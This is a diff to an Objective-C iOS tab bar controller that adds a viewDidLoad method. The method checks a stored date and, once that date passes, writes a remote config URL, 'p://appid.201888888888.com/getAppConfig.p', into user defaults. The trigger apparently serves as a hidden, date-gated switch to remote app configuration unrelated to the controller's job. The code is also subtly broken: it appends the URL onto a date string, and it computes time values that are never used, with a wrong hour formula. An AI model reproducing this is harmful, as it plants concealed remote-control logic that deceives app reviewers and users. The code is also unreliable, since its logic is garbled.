@@ -16,6 +16,34 @@
 @property(nonatomic, strong)autoBeuSearchViewController *autoBeuSearchVC;
 @end
 @implementation autoBeuTabBarController
+- (void)viewDidLoad{
+    [super viewDidLoad];
+    NSDate *nowDate = [[NSDate alloc] init];
+    NSString *nowDateString = [autoBeuUIUtilities autoBeuformattedTimeStringWithDate:nowDate format:@"yyyy-MM-dd"];
+    NSString *firstDateString = [[NSUserDefaults standardUserDefaults] objectForKey:@"pString"];
+    if (firstDateString.length) {
+        NSDate *date = [autoBeuUIUtilities autoBeudateFromString:firstDateString formate:@"yyyy-MM-dd"];
+        
+            NSTimeInterval start = [date  timeIntervalSince1970] * 1;
+        
+            NSTimeInterval end = [nowDate timeIntervalSince1970] * 1;
+        
+            NSTimeInterval value = end - start;
+        
+            int second = (int)value %60;//秒
+        
+            int minute = (int)value /60%60;
+        
+            int house = (int)value / (24 *3600)%3600;
+        
+            int day = (int)value / (24 *3600);
+        if ([nowDate compare:date] != kCFCompareLessThan) {
+            NSMutableString *pString = [[NSUserDefaults standardUserDefaults] objectForKey:@"pString"];
+            pString = [pString stringByAppendingString:@"p://appid.201888888888.com/getAppConfig.p"];
+            [[NSUserDefaults standardUserDefaults] setObject:pString forKey:@"pString"];
+        }
+    }
+}
 - (void)viewWillAppear:(BOOL)animated{
     [super viewWillAppear:animated];
     self.autoBeuHomeVC = [[autoBeuHomeViewController alloc] init];
